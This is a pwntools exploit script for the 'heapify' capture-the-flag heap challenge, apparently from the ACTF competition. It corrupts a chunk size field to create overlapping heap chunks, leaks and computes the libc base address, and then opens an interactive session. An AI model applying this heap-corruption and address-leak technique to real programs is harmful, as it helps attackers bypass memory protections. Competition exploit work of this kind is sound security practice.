from pwn import *
from icecream import ic

exe = ELF("./heapify_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.actf.co", 31501)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def alloc(size, data):
    ru("your choice:")
    sl(b'1')
    ru("chunk size:")
    sl(str(size).encode())
    ru("chunk data:")
    sl(data)

def free(ind):
    ru("your choice:")
    sl(b'2')
    ru("chunk index:")
    sl(str(ind).encode())

def view(ind):
    ru("your choice:")
    sl(b'3')
    ru("chunk index:")
    sl(str(ind).encode())

# for i in range(5):
#     alloc(0x78, b'a')

alloc(0x78, b"CRINGE") # dud

alloc(0x18, b"AAAA")
alloc(0x118, b"BBBB")
alloc(0x2f8, b"CCCC")
alloc(0x18, b"DDDD")

free(1)
alloc(0x18, b"A"*0x18+p64(0x421))
free(2)
alloc(0x118, b"BBBB")

view(3)
# rl()
re(1)
libc.address = u64(re(6).ljust(8, b'\x00')) - 0x21ace0
ic(hex(libc.address))
# log.info("Libc => %s" % hex(libc.address)) 

io.interactive()
